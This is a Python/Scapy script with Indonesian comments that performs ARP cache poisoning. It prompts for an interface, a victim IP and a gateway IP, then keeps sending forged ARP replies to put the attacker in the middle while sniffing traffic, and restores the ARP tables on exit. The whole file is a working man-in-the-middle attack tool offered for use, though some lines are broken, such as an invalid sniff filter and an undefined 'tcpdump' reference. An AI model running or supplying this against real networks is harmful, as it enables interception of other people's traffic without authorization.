#step penting dalam melakukan ARP:
#1. getting mac address
#2. re-ARP targetnya
#3. tricking target

#pdst -> ARP packet dikirim kemana (packet destination)
#psrc -> packet source
#hwsrc -> hardware source FF:FF:FF:FF:FF:FF
#hwdst -> hardware destination

from scapy.all import *
import sys
import time #setting time.sleep
from scapy.layers.l2 import ARP,Ether
from scapy import route

try:
	#3 hal yang selalu perlu kita ketahui destination/victim
	#1. interface, 2. ip victim, 3. router/gate victim
	
	interface = input("[*] input interface: ")
	victimIP = input("[*] input victim ip: ")
	gateIP = input("[*] input gate/router ip: ")
except KeyboardInterrupt:
	print("[*] Shutdown and exiting...")
	sys.exit(1)	
	
print("[*] Enabling IP forwarding........")

#di sini kita mengirimkan permintaan ARP dengan tujuan pilihan kita 
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reArp_target():
	print("[*] Restoring target..")
	victimMac = get_mac(victimIP)
	gateMac = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 5)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMac), count = 5)
	
	print("[*] Restored & exiting...")
	sys.exit(1)
	
#fungsi ini hanya mengirimkan satu balasan ARP ke masing-masing target yang memberitahu mereka bahwa kita adalah target lain. Kita menempatkan diri kita di tengah-tengah
def trick(gateMac, victimMac):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = victimMac))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gateMac))

def arpp():
	try:
		victimMac = get_mac(victimIP)
	except Exception:
		print("[*] Couldn't find Victim Mac Address and exiting..")
		sys.exit(1)
	
	try:
		gateMac = get_mac(gateIP)
	except Exception:
		print("[*] Couldn't find Victim Gate/router Address and exiting..")
		sys.exit(1)
	
	print ("[*] Poisoning target!!")
	
	while 1:
		try:
			trick(gateMac, victimMac)
			time.sleep(1.5)
			sniff(prn=lambda pkt: pkt.sprintf("{IP:%IP.src%}{IPv6:%IPv6.src%}"),filter='*', timeout=5)
			print(tcpdump)
		except KeyboardInterrupt:
			reArp_target()
			break
arpp()